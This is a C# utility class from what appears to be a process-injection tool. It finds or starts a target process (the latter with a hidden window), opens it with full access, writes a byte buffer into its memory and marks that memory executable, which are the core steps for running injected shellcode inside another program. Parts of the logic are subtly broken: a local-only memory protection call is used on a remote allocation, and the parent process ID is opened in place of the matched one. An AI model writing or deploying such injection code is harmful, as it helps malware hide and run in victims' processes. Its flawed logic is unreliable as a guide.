using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ProcessInjection
{
    class utils
    {
        [DllImport("kernel32.dll", EntryPoint = "CloseHandle")]
        private static extern bool CloseH(IntPtr hObject);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryAccess flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, MemoryAccess flNewProtect, out MemoryAccess lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        static extern IntPtr CreateToolhelp32Snapshot([In] UInt32 dwFlags, [In] UInt32 th32ProcessID);

        [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        static extern bool Process32First([In] IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        static extern bool Process32Next([In] IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        public static bool CloseHandle(IntPtr Handle)
        {
            return CloseH(Handle);
        }
        public static bool Is64Arch()
        {
            return !(IntPtr.Size == 4);
        }
        public static IntPtr GetCurrentProcHandle()
        {
            Console.Write("[+] Getting CurrentProcess handle ");
            IntPtr procHandle = Process.GetCurrentProcess().Handle;
            return procHandle;
        }
        public static IntPtr GetProcHandleByName(string procname)
        {
            Process parentProc = null;
            IntPtr handleToSnapshot = IntPtr.Zero;
            try
            {
                PROCESSENTRY32 procEntry = new PROCESSENTRY32();
                procEntry.dwSize = (UInt32)Marshal.SizeOf(typeof(PROCESSENTRY32));
                handleToSnapshot = CreateToolhelp32Snapshot((uint)SnapshotFlags.Process, 0);
                if (Process32First(handleToSnapshot, ref procEntry))
                {
                    do
                    {
                        if (procname == procEntry.szExeFile)
                        {
                            int pid = (int)procEntry.th32ParentProcessID;
                            IntPtr prochandle = OpenProcess(ProcessAccessFlags.All, false, pid);
                            Console.WriteLine("[+] Got handle for " + procname);
                            return prochandle;
                        }
                    } while (Process32Next(handleToSnapshot, ref procEntry));
                }
            }
            catch (Exception)
            {
                Console.WriteLine("[-] can't get " + procname + " Handle ");
                CloseHandle(handleToSnapshot);
            }
            return GetCurrentProcHandle();
        }

        public static IntPtr OpenProcAndGetHandle(string procname)
        {
            try
            {
                Process proc = Process.Start(
                new ProcessStartInfo
                {
                    Arguments = "",
                    FileName = procname,
                    WindowStyle = ProcessWindowStyle.Hidden
                }
                );
                IntPtr prochandle = OpenProcess(ProcessAccessFlags.All, false, proc.Id);
                return prochandle;
            }
            catch
            {
                Console.WriteLine("[-] can't open/get " + procname + " Handle ");
            }
            return GetCurrentProcHandle();
        }

        public static IntPtr AllocInProc(byte[] data, IntPtr procHandle)
        {
            uint datasize = (uint)data.Length;
            IntPtr allocated = VirtualAllocEx(procHandle, IntPtr.Zero, datasize, AllocationType.Commit, MemoryAccess.ReadWrite);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocated, data, datasize, out bytesWritten);
            Console.WriteLine("[+] Allocated " + datasize);
            MemoryAccess old = MemoryAccess.ReadWrite;
            bool vret = VirtualProtect(allocated, datasize, MemoryAccess.Execute, out old);
            if (vret)
            {
                Console.WriteLine("[+] Marked " + datasize + " As Executable ");
            }
            return allocated;
        }
 
    }
}
